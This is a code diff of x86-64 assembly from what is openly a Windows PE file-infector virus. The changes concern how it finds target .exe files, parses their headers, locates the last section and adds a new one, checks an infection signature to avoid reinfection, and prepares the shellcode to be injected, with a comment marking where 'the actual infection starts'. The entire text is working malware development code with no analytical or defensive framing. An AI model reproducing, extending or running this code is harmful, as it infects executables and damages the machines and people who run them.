@@ -518,20 +518,47 @@ _openCurrentFile:
 	cmp 	rax, 0 				; check if .exe
 	jne 	_freeCall
 
+
+	; Find last section
+	xor 	rax, rax
+	mov		rcx, rax
+	mov		rdx, rax
+
+	mov 	eax, [rsi + 3Ch] ;
+	add		rax, rsi ;
+
+	mov cx, WORD [ds:rax + 6]
+	inc WORD [ds:rax + 6] ; number of section n + 1
+
+	mov dx, WORD [rax + 14h]
+	lea r11, [rax + 18h] ; r11 = Optinal Header
+
+	lea rax, [r11 + rdx]
+
+	imul rcx, rcx, 28h ; nSection * sizeof(section)
+	add rax, rcx ; rax : end last section
+
+
+	; ** Check If Signature Exist
+	mov r8, rax	
+	mov rcx, [rax - 28h + 14h]
+	add rcx, rsi
+	add rcx, 0x68
+	lea rdx, [rbx + 0x68]
+	call ft_strcmp
+	jz _freeCall
+	mov rax, r8
+
+	; Setup value for the injection
 	mov 	QWORD [ss:rsp + 120], r13	; store HANDLE hFile onto the stack for later use
 	mov 	QWORD [ss:rsp + 112], r14	; store WIN32_FIND_DATAA struct onto the stack for later use
-	
+
 	xor 	r13, r13
 	xchg 	rdi, r13			; *** r13 : size of target file ***
-	push 	r12
-	xor 	r12, r12
-	mov 	r12, end - start	; *** r12: size of this shellcode
 	xchg 	r14, rdi 
-	pop 	r14				; *** r14: HANDLE hFile ***
+	mov		r14, r12			; *** r14: HANDLE hFile ***
 	xor 	rdi, rdi 			; *** rdi: 0 ***
 	
-	
-
 ;-------------------------------------------------------;
 ; The actual infection starts here:			
 ;							
@@ -539,56 +566,7 @@ _openCurrentFile:
 ;-------------------------------------------------------;
 
 ; Registers configuration at this moment:
-; rbx: this_code entrypoint / rsi: &target_copy  / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
-
-AddNewSection:
-	xor 	rax, rax
-	mov 	rcx, rax
-
-	mov 	eax, [rsi + 3Ch]
-	add 	rax, rsi ; rax: pointer to the PE header
-
-	mov cx, WORD [ds:rax + 6] ; rcx: number of sections
-	push rcx
-	inc cx
-	mov WORD [ds:rax + 6], cx ; number of sections + 1
-
-	xor 	rcx, rcx
-	mov cx, WORD [rax + 14h] ; rcx: size of optional header
-	lea rax, [rax + 18h] ; rax: start of optinal header
-	mov r11, rax
-
-	lea rax, [rax + rcx] ; rax: start of sections header table
-
-	; ** 
-	; xor rcx, rcx
-	; mov ecx, DWORD [rax + 0x10]
-	; mov DWORD [rbx + 0x96], ecx
-
-	pop rcx
-	imul rcx, rcx, 28h
-	add rax, rcx ; rax: pointer to the end of last section
-
-; _checkSignature:
-
-; 	mov r8, rax	
-; 	mov rcx, [rax - 28h + 14h]
-; 	add rcx, rsi
-; 	add rcx, 0x68
-; 	lea rdx, [rbx + 0x68]
-; 	call ft_strcmp
-; 	jz .continue
-; 	mov r13, QWORD [ss:rsp + 120]
-; 	mov r14, QWORD [ss:rsp + 112]
-; 	mov r12, r14
-; 	jmp _freeCall
-; 	.continue:
-; 	mov rax, r8
-	
-	; --------------------------------------------------------
-	; Here we create the new section
-	; --------------------------------------------------------
-
+; rax: end last section / rbx: this_code entrypoint / rsi: &target_copy  / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
 _setupSectionValue:
 
 	mov DWORD [rax], 0x65746373 	; mov DWORD [rax], 'sect'
